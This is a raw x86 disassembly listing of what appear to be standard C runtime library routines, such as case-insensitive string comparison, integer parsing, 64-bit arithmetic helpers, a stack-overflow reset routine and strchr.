  426d00:	mov    ebx,eax
  426d02:	cmp    ebx,edi
  426d04:	jne    0x426d0d
  426d06:	xor    eax,eax
  426d08:	jmp    0x426dc1
  426d0d:	mov    DWORD PTR [ebp-0x24],0x1
  426d14:	push   esi
  426d15:	push   ebx
  426d16:	push   DWORD PTR [ebp-0x28]
  426d19:	push   DWORD PTR [ebp+0x10]
  426d1c:	push   0x1
  426d1e:	push   DWORD PTR [ebp+0x8]
  426d21:	call   DWORD PTR ds:0x4280f8
  426d27:	test   eax,eax
  426d29:	je     0x426db2
  426d2f:	cmp    DWORD PTR [ebp+0x18],edi
  426d32:	je     0x426d54
  426d34:	push   edi
  426d35:	push   edi
  426d36:	push   DWORD PTR [ebp+0x1c]
  426d39:	push   DWORD PTR [ebp+0x18]
  426d3c:	push   esi
  426d3d:	push   ebx
  426d3e:	push   edi
  426d3f:	push   DWORD PTR [ebp+0xc]
  426d42:	call   DWORD PTR ds:0x428088
  426d48:	test   eax,eax
  426d4a:	je     0x426db2
  426d4c:	mov    eax,DWORD PTR [ebp+0x18]
  426d4f:	mov    DWORD PTR [ebp-0x20],eax
  426d52:	jmp    0x426db2
  426d54:	cmp    DWORD PTR [ebp-0x2c],edi
  426d57:	jne    0x426d6f
  426d59:	push   edi
  426d5a:	push   edi
  426d5b:	push   edi
  426d5c:	push   edi
  426d5d:	push   esi
  426d5e:	push   ebx
  426d5f:	push   edi
  426d60:	push   DWORD PTR [ebp+0xc]
  426d63:	call   DWORD PTR ds:0x428088
  426d69:	mov    esi,eax
  426d6b:	cmp    esi,edi
  426d6d:	je     0x426db2
  426d6f:	push   esi
  426d70:	push   0x1
  426d72:	call   0x424a58
  426d77:	pop    ecx
  426d78:	pop    ecx
  426d79:	mov    DWORD PTR [ebp-0x20],eax
  426d7c:	cmp    eax,edi
  426d7e:	je     0x426db2
  426d80:	push   edi
  426d81:	push   edi
  426d82:	push   esi
  426d83:	push   eax
  426d84:	push   esi
  426d85:	push   ebx
  426d86:	push   edi
  426d87:	push   DWORD PTR [ebp+0xc]
  426d8a:	call   DWORD PTR ds:0x428088
  426d90:	cmp    eax,edi
  426d92:	jne    0x426da2
  426d94:	push   DWORD PTR [ebp-0x20]
  426d97:	call   0x42454a
  426d9c:	pop    ecx
  426d9d:	mov    DWORD PTR [ebp-0x20],edi
  426da0:	jmp    0x426db2
  426da2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426da6:	je     0x426db2
  426da8:	mov    ecx,DWORD PTR [ebp+0x14]
  426dab:	mov    DWORD PTR [ecx],eax
  426dad:	jmp    0x426db2
  426daf:	mov    ebx,DWORD PTR [ebp-0x48]
  426db2:	cmp    DWORD PTR [ebp-0x24],edi
  426db5:	je     0x426dbe
  426db7:	push   ebx
  426db8:	call   0x42454a
  426dbd:	pop    ecx
  426dbe:	mov    eax,DWORD PTR [ebp-0x20]
  426dc1:	lea    esp,[ebp-0x54]
  426dc4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426dc7:	xor    ecx,DWORD PTR [ebp+0x4]
  426dca:	call   0x42400c
  426dcf:	call   0x42397b
  426dd4:	ret    
  426dd5:	push   ebp
  426dd6:	mov    ebp,esp
  426dd8:	sub    esp,0x48
  426ddb:	push   ebx
  426ddc:	push   esi
  426ddd:	push   edi
  426dde:	push   0x4
  426de0:	pop    eax
  426de1:	call   0x423990
  426de6:	mov    ebx,esp
  426de8:	push   0x1c
  426dea:	lea    eax,[ebp-0x24]
  426ded:	push   eax
  426dee:	push   ebx
  426def:	call   DWORD PTR ds:0x42803c
  426df5:	test   eax,eax
  426df7:	je     0x426e6a
  426df9:	mov    edi,DWORD PTR [ebp-0x20]
  426dfc:	lea    eax,[ebp-0x48]
  426dff:	push   eax
  426e00:	call   DWORD PTR ds:0x428040
  426e06:	mov    eax,DWORD PTR [ebp-0x44]
  426e09:	lea    esi,[eax-0x1]
  426e0c:	not    esi
  426e0e:	and    esi,ebx
  426e10:	sub    esi,eax
  426e12:	mov    DWORD PTR [ebp-0x4],eax
  426e15:	mov    eax,ds:0x45fba4
  426e1a:	mov    ecx,eax
  426e1c:	dec    ecx
  426e1d:	neg    ecx
  426e1f:	sbb    ecx,ecx
  426e21:	and    ecx,0xffff1000
  426e27:	add    ecx,0x11000
  426e2d:	add    ecx,edi
  426e2f:	cmp    esi,ecx
  426e31:	jb     0x426e6a
  426e33:	cmp    eax,0x1
  426e36:	je     0x426e82
  426e38:	mov    ebx,edi
  426e3a:	mov    edi,0x1000
  426e3f:	push   0x1c
  426e41:	lea    eax,[ebp-0x24]
  426e44:	push   eax
  426e45:	push   ebx
  426e46:	call   DWORD PTR ds:0x42803c
  426e4c:	test   eax,eax
  426e4e:	je     0x426e6a
  426e50:	add    ebx,DWORD PTR [ebp-0x18]
  426e53:	test   DWORD PTR [ebp-0x14],edi
  426e56:	je     0x426e3f
  426e58:	test   BYTE PTR [ebp-0xf],0x1
  426e5c:	mov    ebx,DWORD PTR [ebp-0x24]
  426e5f:	je     0x426e66
  426e61:	xor    eax,eax
  426e63:	inc    eax
  426e64:	jmp    0x426e9e
  426e66:	cmp    esi,ebx
  426e68:	jae    0x426e6e
  426e6a:	xor    eax,eax
  426e6c:	jmp    0x426e9e
  426e6e:	push   0x4
  426e70:	push   edi
  426e71:	push   DWORD PTR [ebp-0x4]
  426e74:	push   ebx
  426e75:	call   DWORD PTR ds:0x42802c
  426e7b:	mov    eax,ds:0x45fba4
  426e80:	jmp    0x426e84
  426e82:	mov    ebx,esi
  426e84:	dec    eax
  426e85:	neg    eax
  426e87:	sbb    eax,eax
  426e89:	and    eax,0x103
  426e8e:	lea    ecx,[ebp-0x8]
  426e91:	push   ecx
  426e92:	inc    eax
  426e93:	push   eax
  426e94:	push   DWORD PTR [ebp-0x4]
  426e97:	push   ebx
  426e98:	call   DWORD PTR ds:0x428050
  426e9e:	lea    esp,[ebp-0x54]
  426ea1:	pop    edi
  426ea2:	pop    esi
  426ea3:	pop    ebx
  426ea4:	leave  
  426ea5:	ret    
  426ea6:	int3   
  426ea7:	int3   
  426ea8:	int3   
  426ea9:	int3   
  426eaa:	int3   
  426eab:	int3   
  426eac:	int3   
  426ead:	int3   
  426eae:	int3   
  426eaf:	int3   
  426eb0:	push   ebp
  426eb1:	mov    ebp,esp
  426eb3:	push   edi
  426eb4:	push   esi
  426eb5:	push   ebx
  426eb6:	mov    esi,DWORD PTR [ebp+0xc]
  426eb9:	mov    edi,DWORD PTR [ebp+0x8]
  426ebc:	mov    al,0xff
  426ebe:	mov    edi,edi
  426ec0:	or     al,al
  426ec2:	je     0x426ef6
  426ec4:	mov    al,BYTE PTR [esi]
  426ec6:	add    esi,0x1
  426ec9:	mov    ah,BYTE PTR [edi]
  426ecb:	add    edi,0x1
  426ece:	cmp    ah,al
  426ed0:	je     0x426ec0
  426ed2:	sub    al,0x41
  426ed4:	cmp    al,0x1a
  426ed6:	sbb    cl,cl
  426ed8:	and    cl,0x20
  426edb:	add    al,cl
  426edd:	add    al,0x41
  426edf:	xchg   al,ah
  426ee1:	sub    al,0x41
  426ee3:	cmp    al,0x1a
  426ee5:	sbb    cl,cl
  426ee7:	and    cl,0x20
  426eea:	add    al,cl
  426eec:	add    al,0x41
  426eee:	cmp    al,ah
  426ef0:	je     0x426ec0
  426ef2:	sbb    al,al
  426ef4:	sbb    al,0xff
  426ef6:	movsx  eax,al
  426ef9:	pop    ebx
  426efa:	pop    esi
  426efb:	pop    edi
  426efc:	leave  
  426efd:	ret    
  426efe:	push   esi
  426eff:	push   edi
  426f00:	call   0x4237f3
  426f05:	mov    edi,DWORD PTR [eax+0x64]
  426f08:	cmp    edi,DWORD PTR ds:0x45f66c
  426f0e:	je     0x426f17
  426f10:	call   0x424c9f
  426f15:	mov    edi,eax
  426f17:	mov    esi,DWORD PTR [esp+0xc]
  426f1b:	cmp    DWORD PTR [edi+0x28],0x1
  426f1f:	movzx  eax,BYTE PTR [esi]
  426f22:	jle    0x426f32
  426f24:	push   0x8
  426f26:	push   eax
  426f27:	push   edi
  426f28:	call   0x426f86
  426f2d:	add    esp,0xc
  426f30:	jmp    0x426f3c
  426f32:	mov    ecx,DWORD PTR [edi+0x48]
  426f35:	movzx  eax,BYTE PTR [ecx+eax*2]
  426f39:	and    eax,0x8
  426f3c:	test   eax,eax
  426f3e:	je     0x426f43
  426f40:	inc    esi
  426f41:	jmp    0x426f1b
  426f43:	movzx  ecx,BYTE PTR [esi]
  426f46:	inc    esi
  426f47:	cmp    ecx,0x2d
  426f4a:	mov    edx,ecx
  426f4c:	je     0x426f53
  426f4e:	cmp    ecx,0x2b
  426f51:	jne    0x426f57
  426f53:	movzx  ecx,BYTE PTR [esi]
  426f56:	inc    esi
  426f57:	xor    eax,eax
  426f59:	cmp    ecx,0x30
  426f5c:	jl     0x426f68
  426f5e:	cmp    ecx,0x39
  426f61:	jg     0x426f68
  426f63:	sub    ecx,0x30
  426f66:	jmp    0x426f6b
  426f68:	or     ecx,0xffffffff
  426f6b:	cmp    ecx,0xffffffff
  426f6e:	je     0x426f7c
  426f70:	lea    eax,[eax+eax*4]
  426f73:	lea    eax,[ecx+eax*2]
  426f76:	movzx  ecx,BYTE PTR [esi]
  426f79:	inc    esi
  426f7a:	jmp    0x426f59
  426f7c:	cmp    edx,0x2d
  426f7f:	pop    edi
  426f80:	pop    esi
  426f81:	jne    0x426f85
  426f83:	neg    eax
  426f85:	ret    
  426f86:	push   ebp
  426f87:	mov    ebp,esp
  426f89:	push   ecx
  426f8a:	mov    eax,DWORD PTR [ebp+0xc]
  426f8d:	lea    ecx,[eax+0x1]
  426f90:	cmp    ecx,0x100
  426f96:	mov    ecx,DWORD PTR [ebp+0x8]
  426f99:	ja     0x426fa4
  426f9b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f9e:	movzx  eax,WORD PTR [ecx+eax*2]
  426fa2:	jmp    0x426ff8
  426fa4:	push   esi
  426fa5:	mov    edx,eax
  426fa7:	sar    edx,0x8
  426faa:	push   edi
  426fab:	mov    edi,DWORD PTR [ecx+0x48]
  426fae:	movzx  esi,dl
  426fb1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426fb6:	pop    edi
  426fb7:	pop    esi
  426fb8:	je     0x426fc9
  426fba:	and    BYTE PTR [ebp-0x2],0x0
  426fbe:	push   0x2
  426fc0:	mov    BYTE PTR [ebp-0x3],al
  426fc3:	mov    BYTE PTR [ebp-0x4],dl
  426fc6:	pop    eax
  426fc7:	jmp    0x426fd3
  426fc9:	and    BYTE PTR [ebp-0x3],0x0
  426fcd:	mov    BYTE PTR [ebp-0x4],al
  426fd0:	xor    eax,eax
  426fd2:	inc    eax
  426fd3:	push   0x1
  426fd5:	push   DWORD PTR [ecx+0x14]
  426fd8:	push   DWORD PTR [ecx+0x4]
  426fdb:	lea    ecx,[ebp+0xe]
  426fde:	push   ecx
  426fdf:	push   eax
  426fe0:	lea    eax,[ebp-0x4]
  426fe3:	push   eax
  426fe4:	push   0x1
  426fe6:	call   0x426068
  426feb:	add    esp,0x1c
  426fee:	test   eax,eax
  426ff0:	jne    0x426ff4
  426ff2:	leave  
  426ff3:	ret    
  426ff4:	movzx  eax,WORD PTR [ebp+0xe]
  426ff8:	and    eax,DWORD PTR [ebp+0x10]
  426ffb:	leave  
  426ffc:	ret    
  426ffd:	int3   
  426ffe:	int3   
  426fff:	int3   
  427000:	mov    eax,DWORD PTR [esp+0x8]
  427004:	mov    ecx,DWORD PTR [esp+0x10]
  427008:	or     ecx,eax
  42700a:	mov    ecx,DWORD PTR [esp+0xc]
  42700e:	jne    0x427019
  427010:	mov    eax,DWORD PTR [esp+0x4]
  427014:	mul    ecx
  427016:	ret    0x10
  427019:	push   ebx
  42701a:	mul    ecx
  42701c:	mov    ebx,eax
  42701e:	mov    eax,DWORD PTR [esp+0x8]
  427022:	mul    DWORD PTR [esp+0x14]
  427026:	add    ebx,eax
  427028:	mov    eax,DWORD PTR [esp+0x8]
  42702c:	mul    ecx
  42702e:	add    edx,ebx
  427030:	pop    ebx
  427031:	ret    0x10
  427034:	int3   
  427035:	int3   
  427036:	int3   
  427037:	int3   
  427038:	int3   
  427039:	int3   
  42703a:	int3   
  42703b:	int3   
  42703c:	int3   
  42703d:	int3   
  42703e:	int3   
  42703f:	int3   
  427040:	push   ebp
  427041:	mov    ebp,esp
  427043:	push   edi
  427044:	push   esi
  427045:	push   ebx
  427046:	mov    ecx,DWORD PTR [ebp+0x10]
  427049:	or     ecx,ecx
  42704b:	je     0x42709a
  42704d:	mov    esi,DWORD PTR [ebp+0x8]
  427050:	mov    edi,DWORD PTR [ebp+0xc]
  427053:	mov    bh,0x41
  427055:	mov    bl,0x5a
  427057:	mov    dh,0x20
  427059:	lea    ecx,[ecx+0x0]
  42705c:	mov    ah,BYTE PTR [esi]
  42705e:	or     ah,ah
  427060:	mov    al,BYTE PTR [edi]
  427062:	je     0x42708b
  427064:	or     al,al
  427066:	je     0x42708b
  427068:	add    esi,0x1
  42706b:	add    edi,0x1
  42706e:	cmp    ah,bh
  427070:	jb     0x427078
  427072:	cmp    ah,bl
  427074:	ja     0x427078
  427076:	add    ah,dh
  427078:	cmp    al,bh
  42707a:	jb     0x427082
  42707c:	cmp    al,bl
  42707e:	ja     0x427082
  427080:	add    al,dh
  427082:	cmp    ah,al
  427084:	jne    0x427091
  427086:	sub    ecx,0x1
  427089:	jne    0x42705c
  42708b:	xor    ecx,ecx
  42708d:	cmp    ah,al
  42708f:	je     0x42709a
  427091:	mov    ecx,0xffffffff
  427096:	jb     0x42709a
  427098:	neg    ecx
  42709a:	mov    eax,ecx
  42709c:	pop    ebx
  42709d:	pop    esi
  42709e:	pop    edi
  42709f:	leave  
  4270a0:	ret    
  4270a1:	int3   
  4270a2:	int3   
  4270a3:	int3   
  4270a4:	int3   
  4270a5:	int3   
  4270a6:	int3   
  4270a7:	int3   
  4270a8:	int3   
  4270a9:	int3   
  4270aa:	int3   
  4270ab:	int3   
  4270ac:	int3   
  4270ad:	int3   
  4270ae:	int3   
  4270af:	int3   
  4270b0:	push   esi
  4270b1:	mov    eax,DWORD PTR [esp+0x14]
  4270b5:	or     eax,eax
  4270b7:	jne    0x4270e1
  4270b9:	mov    ecx,DWORD PTR [esp+0x10]
  4270bd:	mov    eax,DWORD PTR [esp+0xc]
  4270c1:	xor    edx,edx
  4270c3:	div    ecx
  4270c5:	mov    ebx,eax
  4270c7:	mov    eax,DWORD PTR [esp+0x8]
  4270cb:	div    ecx
  4270cd:	mov    esi,eax
  4270cf:	mov    eax,ebx
  4270d1:	mul    DWORD PTR [esp+0x10]
  4270d5:	mov    ecx,eax
  4270d7:	mov    eax,esi
  4270d9:	mul    DWORD PTR [esp+0x10]
  4270dd:	add    edx,ecx
  4270df:	jmp    0x427128
  4270e1:	mov    ecx,eax
  4270e3:	mov    ebx,DWORD PTR [esp+0x10]
  4270e7:	mov    edx,DWORD PTR [esp+0xc]
  4270eb:	mov    eax,DWORD PTR [esp+0x8]
  4270ef:	shr    ecx,1
  4270f1:	rcr    ebx,1
  4270f3:	shr    edx,1
  4270f5:	rcr    eax,1
  4270f7:	or     ecx,ecx
  4270f9:	jne    0x4270ef
  4270fb:	div    ebx
  4270fd:	mov    esi,eax
  4270ff:	mul    DWORD PTR [esp+0x14]
  427103:	mov    ecx,eax
  427105:	mov    eax,DWORD PTR [esp+0x10]
  427109:	mul    esi
  42710b:	add    edx,ecx
  42710d:	jb     0x42711d
  42710f:	cmp    edx,DWORD PTR [esp+0xc]
  427113:	ja     0x42711d
  427115:	jb     0x427126
  427117:	cmp    eax,DWORD PTR [esp+0x8]
  42711b:	jbe    0x427126
  42711d:	dec    esi
  42711e:	sub    eax,DWORD PTR [esp+0x10]
  427122:	sbb    edx,DWORD PTR [esp+0x14]
  427126:	xor    ebx,ebx
  427128:	sub    eax,DWORD PTR [esp+0x8]
  42712c:	sbb    edx,DWORD PTR [esp+0xc]
  427130:	neg    edx
  427132:	neg    eax
  427134:	sbb    edx,0x0
  427137:	mov    ecx,edx
  427139:	mov    edx,ebx
  42713b:	mov    ebx,ecx
  42713d:	mov    ecx,eax
  42713f:	mov    eax,esi
  427141:	pop    esi
  427142:	ret    0x10
  427145:	int3   
  427146:	int3   
  427147:	int3   
  427148:	int3   
  427149:	int3   
  42714a:	int3   
  42714b:	int3   
  42714c:	int3   
  42714d:	int3   
  42714e:	int3   
  42714f:	int3   
  427150:	lea    eax,[edx-0x1]
  427153:	pop    ebx
  427154:	ret    
  427155:	lea    esp,[esp+0x0]
  42715c:	lea    esp,[esp+0x0]
  427160:	xor    eax,eax
  427162:	mov    al,BYTE PTR [esp+0x8]
  427166:	push   ebx
  427167:	mov    ebx,eax
  427169:	shl    eax,0x8
  42716c:	mov    edx,DWORD PTR [esp+0x8]
  427170:	test   edx,0x3
  427176:	je     0x42718d
  427178:	mov    cl,BYTE PTR [edx]
  42717a:	add    edx,0x1
  42717d:	cmp    cl,bl
  42717f:	je     0x427150
  427181:	test   cl,cl
  427183:	je     0x4271d6
  427185:	test   edx,0x3
  42718b:	jne    0x427178
  42718d:	or     ebx,eax
  42718f:	push   edi
  427190:	mov    eax,ebx
  427192:	shl    ebx,0x10
  427195:	push   esi
  427196:	or     ebx,eax
  427198:	mov    ecx,DWORD PTR [edx]
  42719a:	mov    edi,0x7efefeff
  42719f:	mov    eax,ecx
  4271a1:	mov    esi,edi
  4271a3:	xor    ecx,ebx
  4271a5:	add    esi,eax
  4271a7:	add    edi,ecx
  4271a9:	xor    ecx,0xffffffff
  4271ac:	xor    eax,0xffffffff
  4271af:	xor    ecx,edi
  4271b1:	xor    eax,esi
  4271b3:	add    edx,0x4
  4271b6:	and    ecx,0x81010100
  4271bc:	jne    0x4271da
  4271be:	and    eax,0x81010100
  4271c3:	je     0x427198
  4271c5:	and    eax,0x1010100
  4271ca:	jne    0x4271d4
  4271cc:	and    esi,0x80000000
  4271d2:	jne    0x427198
  4271d4:	pop    esi
  4271d5:	pop    edi
  4271d6:	pop    ebx
  4271d7:	xor    eax,eax
  4271d9:	ret    
  4271da:	mov    eax,DWORD PTR [edx-0x4]
  4271dd:	cmp    al,bl
  4271df:	je     0x427217
  4271e1:	test   al,al
  4271e3:	je     0x4271d4
  4271e5:	cmp    ah,bl
  4271e7:	je     0x427210
  4271e9:	test   ah,ah
  4271eb:	je     0x4271d4
  4271ed:	shr    eax,0x10
  4271f0:	cmp    al,bl
  4271f2:	je     0x427209
  4271f4:	test   al,al
  4271f6:	je     0x4271d4
  4271f8:	cmp    ah,bl
  4271fa:	je     0x427202
  4271fc:	test   ah,ah
  4271fe:	je     0x4271d4
  427200:	jmp    0x427198
  427202:	pop    esi
  427203:	pop    edi
  427204:	lea    eax,[edx-0x1]
  427207:	pop    ebx
  427208:	ret    
  427209:	lea    eax,[edx-0x2]
  42720c:	pop    esi
  42720d:	pop    edi
  42720e:	pop    ebx
  42720f:	ret    
  427210:	lea    eax,[edx-0x3]
  427213:	pop    esi
  427214:	pop    edi
  427215:	pop    ebx
  427216:	ret    
  427217:	lea    eax,[edx-0x4]
  42721a:	pop    esi
  42721b:	pop    edi
  42721c:	pop    ebx
  42721d:	ret    
  42721e:	jmp    DWORD PTR ds:0x428054
